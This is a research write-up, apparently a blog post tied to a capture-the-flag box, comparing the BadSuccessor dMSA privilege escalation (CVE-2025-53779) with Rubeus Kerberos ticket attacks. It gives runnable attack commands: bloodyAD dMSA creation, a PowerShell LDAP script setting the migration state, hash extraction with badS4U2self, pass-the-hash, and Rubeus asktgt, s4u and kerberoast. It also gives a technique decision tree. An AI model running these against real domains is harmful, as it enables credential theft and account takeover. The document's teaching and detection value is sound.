---
title: "BadSuccessor (CVE-2025-53779) vs Basic Rubeus TGT Attack"
date: 2026-07-09 00:00:00 +0800
categories: [Writeup]
tags: [AD, Kerberos, writeup, research]
---

# BadSuccessor (CVE-2025-53779) vs Basic Rubeus TGT Attack

From checkpoint.htb -> deep research on dMSA privilege escalation compared with standard Kerberos TGT attacks.

---

## Part 1 — CVE-2025-53779: BadSuccessor

**Discovered by:** Akamai Security Research (May 21, 2025)
**Patched:** August 12, 2025 (Patch Tuesday)
**CVSS:** 7.2 (High)
**Affected:** Any AD domain with ≥1 Windows Server 2025 DC
**Impact:** 91% of real-world domains have non-admin users with sufficient permissions

### 1.1 What is dMSA?

Delegated Managed Service Account — new schema class in Windows Server 2025.

```
top
 └─ person
     └─ organizationalPerson
         └─ user
             └─ computer
                 └─ msDS-DelegatedManagedServiceAccount  ← dMSA
```

Inherits everything from `user` and `computer`: `sAMAccountName`, `userAccountControl`, Kerberos keys, `servicePrincipalName`, etc.

**Legitimate purpose:** Replace old service accounts with auto-rotating-password managed accounts. dMSA "succeeds" old account, inheriting its identity during migration.

### 1.2 Core Vulnerability — The Three Attributes

#### Linked Attributes (Forward/Back Pair)

| Attribute | LinkID | Type | Set On | Writable by Attacker? |
|---|---|---|---|---|
| `msDS-ManagedAccountPrecededByLink` | even | Forward link | dMSA object | **YES** — whoever creates dMSA controls this |
| `msDS-SupersededManagedAccountLink` | odd | Back link | Target account | **NO** — auto-calculated by AD when forward link set |

AD Linked Attributes always come in pairs. You can only write forward links; back links auto-populate.

```
Example:
  member (LinkID 2, forward)  →  memberOf (LinkID 3, back)
  You add CN=test to group's member attribute
  AD auto-fills memberOf=CN=Group on test's object

Same mechanism:
  PrecededByLink (forward on dMSA)  →  SupersededManagedAccountLink (back on target)
  You set PrecededByLink=target_svc on dMSA
  AD auto-fills SupersededManagedAccountLink=dMSA on target_svc
```

> **Note:** Attempting `Set-ADUser <target> -Replace @{'msDS-SupersededManagedAccountLink'=$dmsaDN}` will fail — back links cannot be written manually.

#### Independent Attribute — The Kill Switch

| `msDS-DelegatedMSAState` | Value | Meaning |
|---|---|---|
| (alias: `SupersededServiceAccountState`) | 0 | Migration not started / not set |
| | 1 | Migration in progress |
| | **2** | **Migration complete — KDC transfers keys** |

Requires `WriteProperty` (included in `GenericWrite`). KDC checks this value on every dMSA ticket request. If not `2` → `KDC_ERR_POLICY` even if forward link is correct.

**The bug:** KDC never validated that a real migration actually occurred. Forward link + State=2 = full key handover. No mutual consent needed.

### 1.3 Attack Chain

#### Step 1: Enumerate Who Can Create dMSAs

```powershell
PS> .\BadSuccessor.ps1

Identity                   OUs
--------                   ---
YOURDOM\compromised_user   {OU=ManagedAccounts,DC=yourdom,DC=local}
```

compromised_user has `CreateChild` on target OU — can create dMSA objects there.

#### Step 2: Create dMSA with Forward Link to Target

```bash
bloodyAD -d yourdom.local -u compromised_user -p 'Password123!' \
  --host <DC_IP> \
  add badSuccessor evil_dmsa \
  -t 'CN=target_svc,OU=ServiceAccounts,DC=yourdom,DC=local'
```

What this does in LDAP:
```
LDAP AddRequest → KDC/AD
  objectClass: msDS-DelegatedManagedServiceAccount
  cn: evil_dmsa
  sAMAccountName: evil_dmsa$
  msDS-ManagedAccountPrecededByLink: CN=target_svc,OU=ServiceAccounts,DC=yourdom,DC=local
  
  → AD auto-creates back link on target_svc:
    msDS-SupersededManagedAccountLink: CN=evil_dmsa,OU=ManagedAccounts,DC=yourdom,DC=local
```

#### Step 3: Set Migration State = 2 on Target

Requires `GenericWrite` on target account. Use S.DS.P (System.DirectoryServices.Protocols):

```powershell
Add-Type -AssemblyName System.DirectoryServices.Protocols

$ldap = New-Object System.DirectoryServices.Protocols.LdapConnection("<DC_IP>")
$ldap.SessionOptions.Sealing = $true
$ldap.SessionOptions.Signing = $true
$ldap.Bind()

$mod = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
$mod.Name = "msDS-SupersededServiceAccountState"
$mod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
$mod.Add("2")   # ← "Migration complete"

$req = New-Object System.DirectoryServices.Protocols.ModifyRequest(
    "CN=target_svc,OU=ServiceAccounts,DC=yourdom,DC=local",
    $mod
)
$resp = $ldap.SendRequest($req)
Write-Host "Result: $($resp.ResultCode)"
```

**State after Step 2+3:**
```
target_svc object now has:
  msDS-SupersededManagedAccountLink = CN=evil_dmsa,...  (auto back link)
  msDS-SupersededServiceAccountState = 2               (manually set)

evil_dmsa object has:
  msDS-ManagedAccountPrecededByLink = CN=target_svc,...  (forward link)
```

#### Step 4: Extract Target's NT Hash via badS4U2self

```bash
badS4U2self \
  'kerberos+password://yourdom.local\compromised_user:Password123!@<DC_IP>/?etype=18' \
  'krbtgt/yourdom.local@yourdom.local' \
  'evil_dmsa$@yourdom.local' \
  --dmsa
```

Kerberos protocol level:

```
┌──────────────┐                              ┌──────────┐
│ badS4U2self  │                              │   KDC    │
└──────┬───────┘                              └────┬─────┘
       │                                           │
       │──── AS-REQ (compromised_user, etype=18) ─>│  Standard pre-auth
       │<─── AS-REP (TGT for compromised_user) ─── │
       │                                           │
       │──── TGS-REQ ────────────────────────────> │  S4U2self request
       │     PA-FOR-USER: evil_dmsa$@yourdom.local │
       │     sname: krbtgt/YOURDOM.LOCAL           │
       │                                           │
       │              KDC internal logic:          │
       │              1. Look up evil_dmsa$ object │
       │              2. Find PrecededByLink       │
       │                 → target_svc              │
       │              3. Check target_svc's        │
       │                 State attribute = 2       │
       │              4. "Migration complete"      │
       │              5. Pack target_svc's keys    │
       │                 into response             │
       │                                           │
       │<─── TGS-REP ────────────────────────────  │
       │     enc-part includes:                    │
       │       KERB_DMSA_KEY_PACKAGE               │
       │       previous-keys RC4:                  │
       │         <32_hex_chars>                    │
       │         ↑ target_svc's NT hash            │
       │                                           │
```

**Result:**
```
previous-keys RC4: <target_svc_nt_hash>
```

#### Step 5: Pass-the-Hash

```bash
evil-winrm -i <DC_IP> -u target_svc -H <extracted_nt_hash>

# Or with impacket
impacket-psexec yourdom.local/target_svc@<DC_IP> -hashes :<extracted_nt_hash>
```

---

## Part 2 — Basic Rubeus TGT Attack

### 2.1 What Rubeus asktgt Does

Rubeus sends raw AS-REQ to KDC port 88, requesting TGT for specified user. Credential replay — must already have target's secret.

### 2.2 Supported Authentication Methods

```powershell
# Method 1: Plaintext password
Rubeus.exe asktgt /user:target_svc /password:SomePassword123! /ptt

# Method 2: RC4/NTLM hash (Overpass-the-Hash)
Rubeus.exe asktgt /user:target_svc /rc4:<nt_hash> /ptt

# Method 3: AES256 key (stealthier — avoids RC4 downgrade detection)
Rubeus.exe asktgt /user:target_svc /aes256:<64_hex_chars> /ptt

# Method 4: Certificate/PKINIT (requires AD CS)
Rubeus.exe asktgt /user:target_svc /certificate:target_svc.pfx /ptt

# Method 5: Specify domain and DC explicitly
Rubeus.exe asktgt /user:target_svc /rc4:<nt_hash> \
  /domain:yourdom.local /dc:DC01.yourdom.local /ptt
```

### 2.3 Protocol Flow

```
┌──────────────┐                              ┌──────────┐
│   Rubeus     │                              │   KDC    │
└──────┬───────┘                              └────┬─────┘
       │                                           │
       │──── AS-REQ ─────────────────────────────> │
       │     client: target_svc@YOURDOM.LOCAL      │
       │     PA-ENC-TIMESTAMP:                     │
       │       timestamp encrypted with            │
       │       target_svc's RC4/AES key            │
       │                                           │
       │              KDC internal logic:          │
       │              1. Look up target_svc        │
       │              2. Decrypt PA-ENC-TIMESTAMP  │
       │                 with stored key           │
       │              3. Timestamp valid?          │
       │              4. Issue TGT                 │
       │                                           │
       │<─── AS-REP ─────────────────────────────  │
       │     TGT (encrypted with krbtgt key)       │
       │     Session key                           │
       │                                           │
       │  Rubeus injects TGT into logon session    │
       │  (/ptt = pass-the-ticket)                 │
       │                                           │
       │──── TGS-REQ (using TGT) ───────────────>  │  Now can access
       │<─── TGS-REP (service ticket) ──────────   │  any service
       │                                           │  target_svc has
       │                                           │  access to
```

### 2.4 Common Rubeus Modules for TGT Operations

```powershell
# --- tgtdeleg: Steal usable TGT from current Kerberos session ---
# Uses GSS-API trick to extract RC4-encrypted TGT from existing session
# No password/hash needed — but must be running AS the target user
Rubeus.exe tgtdeleg

# --- renew: Extend TGT lifetime ---
Rubeus.exe renew /ticket:<base64_ticket>

# --- asktgs: Request service ticket using existing TGT ---
Rubeus.exe asktgs /ticket:<base64_tgt> /service:cifs/DC01.yourdom.local

# --- s4u: Constrained Delegation abuse ---
# S4U2self: Get ticket to yourself on behalf of another user
# S4U2proxy: Use that ticket to access target service
Rubeus.exe s4u /ticket:<base64_tgt> /impersonateuser:Administrator \
  /msdsspn:cifs/DC01.yourdom.local /ptt

# --- kerberoast: Request TGS for SPNs (offline cracking) ---
Rubeus.exe kerberoast /user:target_svc /outfile:hashes.txt
```

### 2.5 Why Rubeus Cannot Replace BadSuccessor

```powershell
# Scenario: Shell as user_a but NOT their password
# (obtained via code execution, not credential-based access)

# Attempt 1: tgtdeleg
Rubeus.exe tgtdeleg
# FAIL: Shell via reverse shell (TCP socket)
# No interactive Kerberos logon session → no TGT to extract

# Attempt 2: asktgt
Rubeus.exe asktgt /user:user_a /password:???  /ptt
# FAIL: Password unknown. Shell from code execution, not creds.

# Attempt 3: Target directly
Rubeus.exe asktgt /user:target_svc /rc4:???  /ptt
# FAIL: Don't have target_svc's hash. That's the whole point.
# Rubeus asktgt CANNOT escalate — only replays existing credentials.
```

**BadSuccessor exists because:** It extracts target's hash from KDC without ever knowing it.

---

## Part 3 — Detailed Side-by-Side Comparison

### 3.1 Attack Classification

| Dimension | BadSuccessor | Rubeus asktgt |
|---|---|---|
| **Attack class** | Privilege escalation (low-priv → any account) | Credential replay (same privilege level) |
| **Kerberos abuse type** | Schema/attribute manipulation → KDC logic flaw | Standard pre-authentication with stolen creds |
| **What gets abused** | dMSA migration trust model | PA-ENC-TIMESTAMP pre-auth |
| **Output** | Target's NT hash (never known before) | TGT for user whose creds you already had |

### 3.2 Requirements

| Requirement | BadSuccessor | Rubeus asktgt |
|---|---|---|
| **Target's password/hash** | **NO** — extracted from KDC | **YES** — mandatory input |
| **Any domain cred** | YES (for AS-REQ) | N/A |
| **AD permission needed** | CreateChild on OU + GenericWrite on target | None (just valid creds) |
| **Domain Controller version** | Windows Server 2025+ | Any (2008+) |
| **AD CS** | Not needed | Not needed (unless cert-based) |
| **Machine Account Quota** | Irrelevant | Irrelevant |
| **Network position** | Can be remote (Linux box) | Usually on-host (injects into session) |

### 3.3 What You Get

| Output | BadSuccessor | Rubeus asktgt |
|---|---|---|
| **TGT** | Intermediate (used in chain) | Primary output |
| **NT Hash** | **YES — target's actual hash extracted** | No (you already had it) |
| **Kerberos Keys** | Full key set from KERB_DMSA_KEY_PACKAGE | No |
| **PAC contents** | Target's SIDs + privileges merged into dMSA PAC | Standard PAC for the user |
| **Persistence value** | High — hash usable for pass-the-hash indefinitely | Medium — TGT expires (default 10hrs) |

### 3.4 OPSEC & Detection

| Detection Vector | BadSuccessor | Rubeus asktgt |
|---|---|---|
| **Windows Event** | 2946 (dMSA authentication) | 4768 (TGT issued) |
| **LDAP artifacts** | dMSA object creation, attribute modification | None |
| **Kerberos anomaly** | S4U2self for dMSA$ account | AS-REQ from non-lsass process |
| **BloodHound visibility** | CreateChild edges, GenericWrite edges | N/A |
| **Noise level** | Low — looks like legitimate dMSA migration | Medium — raw Kerberos from unusual source |
| **DCSync needed?** | **NO** — KDC voluntarily returns hash | No (but doesn't give hash either) |
| **Password change?** | **NO** — read-only credential extraction | No |

### 3.5 Post-Exploitation Flow Comparison

```
=== BadSuccessor Path ===

low_priv_user creds (known)
    │
    ▼
bloodyAD add badSuccessor evil_dmsa -t target_svc   ← LDAP create dMSA
    │
    ▼
user_with_write sets State=2 on target_svc          ← LDAP modify (GenericWrite)
    │
    ▼
badS4U2self → AS-REQ(low_priv) → TGS-REQ(evil_dmsa$)  ← Kerberos S4U2self
    │
    ▼
KERB_DMSA_KEY_PACKAGE → RC4 hash extracted           ← KDC hands over keys
    │
    ▼
evil-winrm -H <extracted_hash>                       ← Pass-the-hash
    │
    ▼
target_svc shell ✓


=== Rubeus Path (requires known hash) ===

target_svc hash obtained somehow (Kerberoast? LSASS dump? DCSync?)
    │
    ▼
Rubeus.exe asktgt /user:target_svc /rc4:<hash> /ptt    ← AS-REQ
    │
    ▼
TGT injected into logon session                          ← credential replay
    │
    ▼
Access services as target_svc ✓


KEY DIFFERENCE: BadSuccessor OBTAINS the hash. Rubeus USES an already-known hash.
```

---

## Part 4 — When BadSuccessor Beats Traditional Techniques

BadSuccessor fills a gap when common lateral movement methods are blocked:

| Blocked Technique | Why It Fails | BadSuccessor Bypasses Because |
|---|---|---|
| **Shadow Credentials** | No AD CS → PKINIT can't complete | No AD CS dependency |
| **RBCD** | `ms-DS-MachineAccountQuota = 0` → can't create machine account | No machine account needed |
| **Rubeus tgtdeleg** | Shell via code execution → no Kerberos session in memory | Uses any low-priv cred for AS-REQ, not session extraction |
| **Kerberoast** | Target has no SPN, or hash too strong to crack | Extracts hash directly from KDC — no cracking |
| **DCSync** | Need Replicating Directory Changes privilege | KDC voluntarily returns keys via dMSA mechanism |
| **LSASS dump** | Target not logged in anywhere, or credential guard enabled | Reads from AD database via Kerberos, not process memory |

### When Rubeus asktgt Is Sufficient

Rubeus remains the simpler, more universal tool when credentials are already available:

| Scenario | Rubeus Works Fine |
|---|---|
| Kerberoasted hash cracked offline | `asktgt /rc4:<cracked_hash> /ptt` |
| LSASS dump yielded NT hash | `asktgt /rc4:<dumped_hash> /ptt` |
| Password spraying found valid cred | `asktgt /user:x /password:y /ptt` |
| Certificate obtained from AD CS | `asktgt /certificate:cert.pfx /ptt` |
| AES key extracted from keytab | `asktgt /aes256:<key> /ptt` |

**Rule of thumb:** Have creds → Rubeus. Need creds → BadSuccessor.

---

## Part 5 — Post-Patch Status & BetterSuccessor

### Microsoft's Fix (August 2025)

`kdcsvc.dll` now validates **both sides** of dMSA relationship:

```
Pre-patch:   dMSA → PrecededByLink → target  +  State=2     ← enough
Post-patch:  dMSA → PrecededByLink → target                  ← not enough alone
       target → SupersededLink → dMSA   (auto)
       target → State=2                                 
       KDC also verifies mutual consent / migration log ← NEW CHECK
```

One-sided link no longer yields impersonation TGT or keys.

### BetterSuccessor (Post-Patch Variant)

If attacker has **both**:
- CreateChild on OU (to create/modify dMSA)
- GenericWrite on target account (to complete mutual pairing)

...attack still works. Attacker completes mutual pairing manually = looks like real migration.

### Pre-Patch vs Post-Patch Requirements

| Requirement | BadSuccessor (Pre-Patch) | BetterSuccessor (Post-Patch) |
|---|---|---|
| CreateChild on any OU | YES | YES |
| GenericWrite on target | YES (to set State=2) | YES (to set State=2 **and** complete mutual link) |
| KDC validation bypass | Free — no mutual check | Must satisfy mutual check by controlling both sides |
| Effective difficulty | Low | Same if you already have GenericWrite on target |

### dMSA Now Joins Privilege Amplifier Family

All techniques below convert `GenericWrite` (or similar) into higher-privilege access:

| Technique | Additional Requirement | What It Gives |
|---|---|---|
| **BadSuccessor/BetterSuccessor** | CreateChild on OU | Target's NT hash via KDC |
| **RBCD** | Machine account (or quota > 0) | Impersonation via delegation |
| **Shadow Credentials** | AD CS enrolled | TGT via PKINIT |
| **Targeted Kerberoasting** | Target must be user (not computer) | Crackable TGS hash |
| **gMSA password read** | PrincipalsAllowedToRetrieve membership | gMSA's NT hash |
| **Forced password change** | ResetPassword right (not GenericWrite) | Direct credential control |

### Decision Tree: Which Technique to Use

```
Have GenericWrite on target?
├─ YES
│   ├─ Windows Server 2025 DC exists?
│   │   ├─ YES → BadSuccessor / BetterSuccessor (best: direct hash, no cracking)
│   │   └─ NO ↓
│   ├─ AD CS enrolled?
│   │   ├─ YES → Shadow Credentials (PKINIT → TGT)
│   │   └─ NO ↓
│   ├─ MachineAccountQuota > 0?
│   │   ├─ YES → RBCD (create machine acct + delegation)
│   │   └─ NO ↓
│   ├─ Target is user with SPN (or can set SPN)?
│   │   ├─ YES → Targeted Kerberoasting (offline crack)
│   │   └─ NO ↓
│   └─ Forced password change (noisy, last resort)
│
└─ NO — need creds from elsewhere
  ├─ Have target's hash/password already? → Rubeus asktgt
  ├─ Target has SPN? → Kerberoast (then Rubeus asktgt with cracked hash)
  ├─ Can dump LSASS? → Extract hash (then Rubeus asktgt)
  └─ Can DCSync? → secretsdump (then Rubeus asktgt / pass-the-hash)
```

---

## Sources

- [Akamai: BadSuccessor — Abusing dMSA for Privilege Escalation](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Akamai: BadSuccessor Is Dead, Long Live BadSuccessor(?)](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [HelpNetSecurity: Microsoft fixes CVE-2025-53779](https://www.helpnetsecurity.com/2025/08/13/microsoft-fixes-badsuccessor-kerberos-vulnerability-cve-2025-53779/)
- [AlteredSecurity: BetterSuccessor — Post-Patch dMSA Abuse](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [Semperis: How to Detect and Mitigate dMSA Privilege Escalation](https://www.semperis.com/blog/badsuccessor-how-to-detect-mitigate-dmsa-privilege-escalation/)
- [Tarlogic: BadSuccessor Technical Details](https://www.tarlogic.com/blog/badsuccessor/)
- [HackTricks: BadSuccessor dMSA Migration Abuse](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/badsuccessor-dmsa-migration-abuse.html)
- [Unit42: When Good Accounts Go Bad](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [CovertSwarm: Inside BadSuccessor Technical Deep Dive](https://www.covertswarm.com/post/bad-successor-technical-deep-dive)
- [SOCRadar: August 2025 Patch Tuesday — CVE-2025-53779](https://socradar.io/blog/august-2025-patch-tuesday-kerberos-0day-cve-2025-53779/)
- [GhostPack/Rubeus](https://github.com/ghostpack/rubeus)
- [SpecterOps: Rubeus asktgt Documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/asktgt)
- [Wiz: CVE-2025-53779 Impact Analysis](https://www.wiz.io/vulnerability-database/cve/cve-2025-53779)
- [Tenable: BadSuccessor FAQ](https://www.tenable.com/blog/frequently-asked-questions-about-badsuccessor)
